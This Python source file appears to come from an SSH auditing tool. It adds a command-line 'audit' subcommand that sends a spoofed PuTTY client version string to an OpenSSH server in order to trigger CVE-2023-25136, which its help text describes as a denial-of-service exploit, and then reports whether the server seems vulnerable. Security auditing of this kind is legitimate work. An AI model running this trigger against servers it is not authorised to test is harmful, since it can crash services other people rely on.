# Source: https://github.com/rushter/blog_code
# More Information: https://rushter.com/blog/public-ssh-keys/

import argparse
import logging
import sys

import paramiko

from sshmitm.moduleparser import SubCommand


def perform_cve_2023_25136(args: argparse.Namespace) -> bool:
    transport = paramiko.Transport(f"{args.host}:{args.port}")
    transport.local_version = f"SSH-2.0-{args.client_id}"
    try:
        # connect with no username and password
        transport.connect(username="", password="")  # nosec
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception:  # pylint: disable=broad-exception-caught # noqa: BLE001
        # catch all exceptions to avoid applicaiton crashes
        logging.error("error executing check for CVE-2023-25136")
    return True


class Audit(SubCommand):
    """audit tools for ssh servers"""

    def register_arguments(self) -> None:
        subparsers = self.parser.add_subparsers(
            title="Available commands",
            dest="audit_subparser_name",
            metavar="audit-command",
        )
        subparsers.required = True

        parser_scan_auth = subparsers.add_parser(
            "CVE-2023-25136",
            help="performs a DoS against OpenSSH, which exploits CVE-2023-25136",
        )
        parser_scan_auth.add_argument(
            "--host", type=str, required=True, help="Hostname or IP address"
        )
        parser_scan_auth.add_argument(
            "--port", type=int, default=22, help="port (default: 22)"
        )
        parser_scan_auth.add_argument(
            "--client-id",
            dest="client_id",
            default="PuTTY_Release_0.64",
            help="client id string, which triggers the exploit",
        )

    def execute(self, args: argparse.Namespace) -> None:
        if args.audit_subparser_name == "CVE-2023-25136":
            if not perform_cve_2023_25136(args):
                print("ERROR - failed to execute the exploit")
                sys.exit(1)
            print("OK -> server seems vulnerable")
